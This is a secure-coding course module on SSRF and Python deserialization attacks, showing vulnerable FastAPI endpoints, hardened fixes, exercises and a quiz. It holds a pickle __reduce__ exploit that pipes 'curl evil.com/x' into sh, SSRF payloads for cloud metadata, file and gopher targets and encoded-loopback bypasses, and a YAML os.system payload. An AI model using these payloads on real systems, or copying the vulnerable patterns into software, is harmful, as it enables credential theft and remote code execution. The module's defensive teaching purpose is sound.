# Module 03: SSRF and Deserialization Attacks

## Why this matters

Modules 01 and 02 were about attacker input reaching a *data* interpreter (SQL,
the browser). This module covers two attacks where the thing you trust is more
dangerous still: a **URL** you fetch, and **bytes** you rebuild into objects.

**SSRF (Server-Side Request Forgery, OWASP A10)** is what happens when your
server makes an HTTP request to a URL the *user* supplied. It sounds harmless —
"fetch the image at this URL," "call this webhook," "import from this feed" —
until you realize your server sits *inside* your network, behind the firewall,
with an identity the outside world doesn't have. An attacker who controls the
URL gets to make requests *from your server's position*: to internal admin
panels, to databases, and — most infamously — to the **cloud metadata endpoint**
that hands out your credentials. SSRF was the root of the 2019 Capital One
breach (100M+ records). It's on the Top 10 precisely because "fetch a URL" is
everywhere and looks innocent.

**Insecure deserialization (A08, Integrity Failures)** is the other trap, and in
Python it has a name: `pickle`. Deserialization turns bytes back into live
objects — and some formats can reconstruct *arbitrary code execution* in the
process. Feeding untrusted data to `pickle.loads` (or `yaml.load`, or a Python
`eval`) is not a data bug; it's handing the attacker a shell. Both attacks share
module 00's theme — trusting input you shouldn't — but here the payoff is your
server itself, so the fixes are non-negotiable.

## Concepts

### SSRF — making your server the attacker's proxy

The vulnerable pattern is any endpoint that takes a URL (or a host, or something
that becomes a URL) from the user and fetches it server-side:

```python
import httpx
from fastapi import APIRouter
router = APIRouter()

@router.post("/fetch-preview")            # "give us a URL, we'll generate a preview"
async def fetch_preview(url: str):
    async with httpx.AsyncClient() as client:
        r = await client.get(url)          # VULNERABLE — fetches WHATEVER the user says
    return {"title": extract_title(r.text)}
```

The problem is *whose* request this is. Your server can reach places the
attacker's own machine cannot:

- **Internal services.** `http://localhost:8001/admin`, `http://10.0.0.5:6379`
  (Redis), `http://internal-billing/`, `http://192.168.1.1/`. These often have
  *no auth* because "they're only reachable from inside the network" — and your
  server is inside the network. SSRF turns your public endpoint into a proxy
  into your private one.
- **Cloud metadata endpoints.** On AWS/GCP/Azure, a magic link-local address
  (`http://169.254.169.254/...`) serves instance metadata *including temporary
  IAM credentials* to anything running on the instance. An attacker who makes
  your server fetch it gets your cloud keys — this is the Capital One breach in
  one sentence.
- **Other schemes/targets.** `file:///etc/passwd`, `gopher://` (used to forge
  arbitrary TCP payloads to internal services), `http://[::1]`, DNS rebinding.

```
  attacker ─"url=http://169.254.169.254/…"─► YOUR SERVER ─fetch─► ┌ cloud metadata (IAM creds)
   (outside; no route to internals)          (inside the network) ├ 10.0.0.5:6379  (Redis, no auth)
                                                                   └ internal-admin  (no auth)
   the attacker borrows your server's position to reach what they can't reach directly
```

The reason SSRF is hard to fix is that the naive defenses are all bypassable.

### Why blocklists don't fix SSRF (and what does)

The tempting fix — "block `localhost`, `127.0.0.1`, and `169.254.169.254`" — is
a blocklist, and it fails for the same structural reason as module 01's
character blocklists: the input space is bigger than your list. Bypasses:

- **Alternate IP encodings:** `127.0.0.1` = `2130706433` (decimal) =
  `0x7f000001` (hex) = `127.1` = `[::ffff:127.0.0.1]`.
- **DNS tricks:** an attacker's domain `evil.com` that *resolves* to
  `169.254.169.254`; or **DNS rebinding**, where the name passes your check as a
  public IP, then re-resolves to an internal IP for the actual fetch (TOCTOU).
- **Redirects:** you fetch an allowed public URL that responds `302 Location:
  http://169.254.169.254/...` and your client follows it inside.

The defenses that actually work, layered (defense in depth):

- **Allowlist, don't blocklist.** If the feature only needs to reach a known set
  of hosts (a specific partner API, your own S3 bucket), allow *only* those and
  reject everything else. This is the strongest control and the one to reach for
  first.
- **Resolve then validate then pin.** When you must accept arbitrary public URLs,
  resolve the hostname to an IP *yourself*, reject the request if the IP is
  private/link-local/loopback (`ipaddress.ip_address(...).is_private /
  is_loopback / is_link_local / is_reserved`), and then connect to *that
  validated IP* — closing the DNS-rebinding gap between check and use.
- **Disable redirects** (`follow_redirects=False`) so a public URL can't bounce
  you inward, or re-validate each hop.
- **Restrict scheme** to `http`/`https` only (kill `file:`, `gopher:`).
- **Network-layer egress controls.** The backstop: firewall rules / a locked-
  down egress proxy so the app *cannot* reach the metadata IP or internal
  ranges even if the code check is bypassed. Block `169.254.169.254` at the
  network. (On AWS, also enforce IMDSv2, which requires a token and blocks the
  simplest SSRF-to-metadata path.)

```python
import ipaddress, socket
from urllib.parse import urlparse

def safe_url(url: str) -> str:
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        raise ValueError("scheme not allowed")
    ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))   # resolve ourselves
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
        raise ValueError("target resolves to a non-public address")  # blocks 169.254.x, 10.x, 127.x
    return url          # then fetch with follow_redirects=False; ideally pin to `ip`
```

### Deserialization — turning bytes into objects (and sometimes code)

**Serialization** turns an in-memory object into bytes (to store or send);
**deserialization** turns bytes back into an object. The risk is that some
formats don't just carry *data* — they carry instructions the deserializer
*executes* while rebuilding, so untrusted bytes become untrusted *behavior*.

The danger scale:

- **Data-only formats — safe by design.** JSON, and formats that only ever
  produce strings/numbers/lists/dicts, cannot execute code on load. `json.loads`
  of hostile input can at worst give you a weird-shaped dict (validate it) — it
  can't run anything. This is why JSON is the default for untrusted data.
- **Code-executing formats — dangerous.** Formats that can instantiate arbitrary
  objects or call functions during load. In Python the headline example is
  `pickle`, and also `yaml.load` (the unsafe loader), `marshal`, and anything
  built on `eval`/`exec`.

### `pickle` is a remote-code-execution primitive

This deserves its own section because it's the single most common Python
security mistake. **`pickle` can execute arbitrary code during
`pickle.loads`.** It's not a bug; it's how pickle works — the pickle format
includes opcodes that construct objects by *calling* things, and an object's
`__reduce__` method can specify *any* callable to run on unpickling:

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl evil.com/x | sh",))   # runs on the VICTIM's loads()

payload = pickle.dumps(Exploit())      # attacker crafts this
# ... victim does ...
pickle.loads(payload)                  # ← executes os.system(...) — full RCE
```

Anywhere untrusted bytes reach `pickle.loads`, you have remote code execution.
And pickle hides in surprising places: a **Redis/Memcached cache** where the
values are pickled (an attacker who can write to the cache — via another bug —
gets RCE on every reader), **Celery** with the pickle serializer (module 06 of
track 06 — use JSON), **session cookies** or files that store pickled objects,
ML model files (`torch.load`, `joblib`) which pickle under the hood, and
`pandas.read_pickle`. The rule is absolute: **never `pickle.loads` data that
crossed a trust boundary.** Pickle is fine for data that never leaves your
trust zone (your own process's temp files); it is *never* fine for anything a
user, a network peer, or a shared datastore could influence.

```
  pickle.loads(untrusted): bytes ─► __reduce__ opcodes CALL things ─► os.system(...) → RCE
  json.loads(untrusted):   bytes ─► only str / num / list / dict produced ─► worst case:
                                    a wrong-shaped dict you then validate (never code)
```

### Safe alternatives and the general fix

- **Prefer a data-only format: JSON.** For app data crossing trust boundaries,
  use `json` — it can't execute code. Then **validate the shape** with Pydantic
  (a dict is not proof the *right* dict arrived; module 01's NoSQL lesson
  applies).
- **YAML: always `yaml.safe_load`, never `yaml.load`.** `yaml.load` with the
  default/FullLoader can construct arbitrary Python objects (`!!python/object`)
  — an RCE path just like pickle. `yaml.safe_load` restricts to basic types.
- **Never `eval`/`exec` on untrusted input.** `eval(request_body)` is RCE by
  definition. If you need to parse structured input, use a real parser
  (`json.loads`, `ast.literal_eval` for *literals only*), never `eval`.
- **If you must transport rich objects, sign the bytes.** When a format's
  power is genuinely needed, attach an **HMAC signature** (track 06's webhook
  pattern) so you only deserialize bytes *you* produced and verify (constant-
  time, track 03 m07) before loading. Better still: redesign so you don't have
  to — pass an id and re-fetch (track 06's "pass IDs, not objects").
- **General principle (A08):** treat all serialized input as untrusted; verify
  integrity/authenticity before acting on it; and prefer formats that carry
  *data*, not *behavior*.

```python
import json, yaml
from pydantic import BaseModel

class Config(BaseModel):
    retries: int
    endpoints: list[str]

cfg = Config(**json.loads(untrusted_bytes))     # JSON can't execute; Pydantic validates shape
cfg = Config(**yaml.safe_load(untrusted_yaml))  # safe_load — NEVER yaml.load / full loader
# pickle.loads(untrusted_bytes)                 # ← never, on anything untrusted: RCE
```

## Command reference

| Pattern | Purpose | Snippet |
|---|---|---|
| URL allowlist | strongest SSRF defense | reject unless host in `{known partners}` |
| resolve + `ipaddress` check | block internal/metadata targets | `ip.is_private/is_loopback/is_link_local` |
| `follow_redirects=False` | stop redirect-to-internal | `httpx.AsyncClient(follow_redirects=False)` |
| scheme allowlist | kill `file:`/`gopher:` | accept only `http`/`https` |
| network egress rules / IMDSv2 | backstop below the code | block `169.254.169.254` at the network |
| `json.loads` + Pydantic | safe deserialization + shape check | data-only format, validated |
| `yaml.safe_load` | safe YAML | never `yaml.load`/FullLoader on untrusted |
| **never** `pickle.loads(untrusted)` | avoid RCE | pickle only within your trust zone |
| HMAC-sign serialized bytes | if rich format unavoidable | verify constant-time before loading |

A hardened URL-fetching endpoint — the SSRF half in one snippet:

```python
import httpx, ipaddress, socket
from urllib.parse import urlparse
from fastapi import APIRouter, HTTPException

router = APIRouter()
ALLOWED_HOSTS = {"api.partner.com", "cdn.partner.com"}   # allowlist first if you can

@router.post("/fetch-preview")
async def fetch_preview(url: str):
    p = urlparse(url)
    if p.scheme not in ("http", "https"):
        raise HTTPException(400, "bad scheme")
    if p.hostname not in ALLOWED_HOSTS:                  # strongest control
        raise HTTPException(400, "host not allowed")
    ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))   # and re-validate the IP
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
        raise HTTPException(400, "target not public")
    async with httpx.AsyncClient(follow_redirects=False, timeout=5) as client:
        r = await client.get(url)          # redirects off so it can't bounce inward
    return {"len": len(r.text)}
```

## Hands-on exercises

Continue in `sec-track`. For the metadata exercise you don't need a real cloud
account — run a tiny local server on `169.254.169.254`-stand-in (use
`127.0.0.1:9000` serving a fake "credentials" JSON) to represent the internal
target, and point the SSRF at it.

### 1. Build the vulnerable fetcher and hit an internal target

Write the `/fetch-preview?url=` endpoint that does `httpx.get(url)` with no
checks. Stand up a second local server (a fake "internal admin" on
`127.0.0.1:9000` returning `SECRET-INTERNAL-DATA`). From the public endpoint,
pass `url=http://127.0.0.1:9000/`. Expected: your public endpoint returns the
internal server's secret — you've proven SSRF reaches inside.

### 2. Simulate the metadata-credentials theft

Point your fake internal server at a `/latest/meta-data/iam/...` path returning
a JSON blob of fake "credentials." Fetch it through the SSRF endpoint. Expected:
the "IAM credentials" come back through your public API — this is, mechanically,
the Capital One breach. Write one sentence on why the metadata endpoint is so
catastrophic a target.

### 3. Break a naive blocklist

Add a "fix" that rejects `url` containing `127.0.0.1` or `localhost`. Now bypass
it: try `http://0x7f000001/`, `http://2130706433/`, `http://127.1/`, or a
hostname you control (via `/etc/hosts` or a `*.localtest.me`-style name) that
resolves to `127.0.0.1`. Expected: at least one bypass reaches the internal
target anyway — proving blocklists don't fix SSRF.

### 4. Fix it properly: resolve, validate, pin

Replace the blocklist with: scheme allowlist, resolve the hostname to an IP
yourself, reject `is_private/is_loopback/is_link_local/is_reserved`, and (bonus)
connect to the resolved IP. Replay every bypass from exercise 3. Expected: all
of them are rejected because they *resolve* to non-public addresses regardless
of how the input was encoded.

### 5. Defeat the redirect bypass

With your validated fetcher, set up a *public-looking* URL (a local server on a
non-loopback interface, or mock it) that returns `302 Location:
http://127.0.0.1:9000/`. Fetch it with `follow_redirects=True`. Expected: you
land on the internal target despite the initial URL passing validation. Fix with
`follow_redirects=False` (or re-validate each hop) and confirm.

### 6. Pickle RCE against yourself

Write the `Exploit.__reduce__` class from Concepts (have it create a file
`/tmp/pwned` or print a banner rather than anything harmful), `pickle.dumps` it,
and `pickle.loads` the bytes. Expected: your "innocent" `loads` runs the
payload. Internalize that this requires *no* bug in your logic — `loads` itself
is the vulnerability.

### 7. Find the pickle hiding in a cache

Build a cache helper that stores/loads values with `pickle` in Redis (or a
dict). Now imagine an attacker who can write one cache key (via some other bug):
write a pickled `Exploit` to that key and call your cache `get`. Expected: RCE on
read. Then switch the cache serializer to `json` and confirm the same poisoned
value is now inert (worst case: a bad dict, which you validate).

### 8. YAML config loader: `load` vs `safe_load`

Load a config file with `yaml.load(..., Loader=yaml.FullLoader)` (or bare
`yaml.load` on an old version) and feed it a `!!python/object/apply:os.system`
payload. Observe (or reason precisely about) the code execution. Switch to
`yaml.safe_load` and confirm the payload is rejected/inert. Expected: you can
state exactly why `safe_load` is mandatory for any config a user can influence.

### 9. Diagnose and fix: the import-from-URL feature

Audit this "import your data from a URL, we cache the parsed result" endpoint for
*both* an SSRF and a deserialization flaw, and fix both.

```python
import httpx, pickle
@app.post("/import")
async def import_data(source_url: str):
    async with httpx.AsyncClient() as c:
        raw = (await c.get(source_url)).content        # fetches any URL, follows redirects
    obj = pickle.loads(raw)                            # trusts remote bytes
    redis.set(f"import:{source_url}", pickle.dumps(obj))
    return {"imported": len(obj)}
```

<details>
<summary>Solution</summary>

Two critical flaws. (1) **SSRF** — `source_url` is fetched with no validation and
default redirect-following, so it reaches internal services / `169.254.169.254`.
Fix: allowlist hosts if possible; otherwise scheme-check, resolve + reject
private/loopback/link-local/reserved IPs, `follow_redirects=False`, and back it
with network egress rules. (2) **Insecure deserialization / pickle RCE** —
`pickle.loads(raw)` on *remote* bytes is direct remote code execution; the
attacker serves a crafted pickle and owns your server. Fix: transport a data-only
format (`json.loads`) and validate the shape with Pydantic; never `pickle` across
a trust boundary. (Bonus: the endpoint then re-`pickle`s into Redis — a second
pickle-in-cache hazard; store JSON there too so a poisoned cache value can't RCE
readers.) Corrected shape: validate+pin the URL, fetch with redirects off, parse
as JSON, validate the object, cache as JSON.

</details>

## Independent challenge

No code given. Build a "website screenshot / link-preview" service for
`sec-track`: the user submits a URL, your server fetches it, extracts the title
and a data-only summary, and caches the result. Make it **SSRF-proof** — decide
whether an allowlist is possible for your use case (justify it) and, if you must
accept arbitrary public URLs, implement resolve-validate-(pin) with redirects
disabled and a scheme allowlist, plus describe the network-layer egress backstop
you'd add in production. Then make the **caching layer deserialization-safe**:
store and reload the cached summary in a format that cannot execute code, and
validate its shape on load (reach back to **module 01**'s "a dict is not proof of
the right dict" and Pydantic typing). Finally, write a threat-model note (module
00's lens) covering: what internal targets your unprotected version could have
reached, why a blocklist would not have sufficed, and why `pickle` in the cache
would have been an RCE even though "the data is our own."

<details>
<summary>Hint</summary>

The subtlety that separates a real SSRF fix from a fake one is the **gap between
validation and use**: if you check the hostname's IP and *then* let the HTTP
client re-resolve the name to connect, DNS rebinding slips a public IP past your
check and an internal IP into the actual socket (a TOCTOU bug). Closing it means
resolving once and connecting to *that* IP, and disabling redirects so a
validated URL can't `302` you inward. For the cache, the trap in "the data is
our own" is that a *separate* vulnerability (a cache-write bug, a poisoned
upstream) can plant bytes another code path will `pickle.loads` — so the RCE
doesn't need the attacker to control the pickle directly, only to influence what
lands in a store you later deserialize. JSON removes the primitive entirely:
worst case is a malformed dict, which Pydantic rejects.

</details>

## Common mistakes & troubleshooting

- **Fetching a user-supplied URL with no validation.** Classic SSRF — reaches
  internal services and cloud metadata. Allowlist hosts; else resolve+validate
  the IP and disable redirects.
- **Blocklisting `localhost`/`127.0.0.1`/`169.254...`.** Bypassable via decimal/
  hex/short IP encodings, DNS names, and rebinding. Allowlist or resolve-and-
  validate against private/loopback/link-local/reserved.
- **Leaving redirects enabled on the fetcher.** A validated public URL can `302`
  to an internal one. `follow_redirects=False` (or re-validate every hop).
- **Relying on the code check alone.** Add the network backstop (egress firewall,
  IMDSv2) so a bypass still can't reach the metadata IP.
- **`pickle.loads` on anything untrusted.** It's remote code execution by design
  — including via caches (Redis/Memcached), Celery, sessions, and ML model
  files. Use JSON across trust boundaries; pickle only within your process.
- **`yaml.load` / FullLoader on user-influenced config.** Can construct
  arbitrary objects (RCE). Always `yaml.safe_load`.
- **`eval`/`exec` on request input.** RCE by definition. Use `json.loads` /
  `ast.literal_eval`, never `eval`.
- **Assuming JSON is safe *shape*.** JSON can't execute code, but a valid-JSON
  hostile *shape* still needs Pydantic validation (module 01's NoSQL lesson).

## Checkpoint quiz

Write down your answer to each question before expanding it — checking without attempting first is the single easiest way to fool yourself into thinking you've learned this.

1. What is SSRF, and why is "my server fetches a URL" so much more dangerous than
   "the user's browser fetches a URL"?
2. Name three things an attacker targets via SSRF and why the cloud metadata
   endpoint is the worst.
3. Why doesn't a blocklist of `localhost`/`127.0.0.1`/`169.254.169.254` fix
   SSRF? Give two bypasses and the defense that actually works.
4. What is DNS rebinding, and what property must a correct SSRF fix have to stop
   it?
5. Why is `pickle.loads` on untrusted data a remote-code-execution
   vulnerability, not merely a data bug? Name two non-obvious places pickle
   hides.
6. Why is JSON a safe deserialization format where pickle is not, and what must
   you still do after `json.loads`?
7. What's the difference between `yaml.load` and `yaml.safe_load`, and which do
   you use for user-influenced input?

<details>
<summary>Answers</summary>

1. SSRF is when your server makes an HTTP request to a URL an attacker
   controls. It's dangerous because your server sits *inside* your network with
   an identity/position the attacker's own machine lacks — so the attacker's URL
   is fetched *from the server's trusted vantage point*, reaching internal
   services and credentials the outside world can't touch.
2. Internal services (unauthenticated admin panels, Redis, internal APIs), the
   cloud metadata endpoint (`169.254.169.254`), and other schemes/hosts
   (`file://`, internal IPs). Metadata is worst because it hands out temporary
   IAM credentials to anything on the instance — SSRF to it steals your cloud
   keys (the Capital One breach).
3. The input space is larger than any blocklist: `127.0.0.1` can be written
   `2130706433`, `0x7f000001`, `127.1`; or a DNS name can resolve to an internal
   IP; or a redirect bounces you inward. The fix: allowlist hosts, or resolve the
   name yourself and reject private/loopback/link-local/reserved IPs, with
   redirects disabled.
4. DNS rebinding: the hostname resolves to a public IP when you *check* it, then
   re-resolves to an internal IP when the client actually *connects* (a
   time-of-check/time-of-use gap). The fix must resolve once and connect to that
   *same validated IP* (pin it), not let the client re-resolve.
5. Because the pickle format includes opcodes that *call* callables while
   rebuilding an object (`__reduce__` can name any callable), so loading
   attacker bytes executes attacker code — RCE, by design, not a bug. Hidden
   spots: pickle-serialized caches (Redis/Memcached), Celery's pickle
   serializer, session stores, and ML model files (`torch.load`/`joblib`/
   `read_pickle`).
6. JSON is a data-only format — it can only produce strings/numbers/lists/dicts
   and has no mechanism to call code on load — so the worst hostile JSON does is
   yield a bad-shaped dict. After `json.loads` you must still *validate the
   shape/types* (Pydantic), because valid JSON is not proof of the expected
   structure.
7. `yaml.load` (default/FullLoader) can construct arbitrary Python objects
   (`!!python/object/apply:...`) — an RCE path like pickle; `yaml.safe_load`
   restricts to basic types. Always use `safe_load` for any user-influenced
   input.

</details>

## Further reading & sources

- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) - allowlisting, resolve-then-validate, and why blocklists fail.
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) - safe formats and integrity checks for serialized data across languages.
- [Python `pickle` docs - security warning](https://docs.python.org/3/library/pickle.html#module-pickle) - the official "never unpickle untrusted data" warning and why.
- [Python `ipaddress` module](https://docs.python.org/3/library/ipaddress.html) - the `is_private`/`is_loopback`/`is_link_local`/`is_reserved` checks used to validate resolved IPs.
- [AWS - Use IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) - the token-required metadata service that blocks the simplest SSRF-to-credentials path.
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html) - the formal weakness definition (see CWE-502 for deserialization).

## Next

[04-rate-limiting-and-abuse-prevention](../04-rate-limiting-and-abuse-prevention/README.md)
— from single-request attacks to *volume* attacks. Rate limiting is the control
that stands between an attacker and unlimited attempts: brute force, credential
stuffing, scraping, and resource exhaustion. You'll implement token-bucket and
sliding-window limiters backed by Redis.
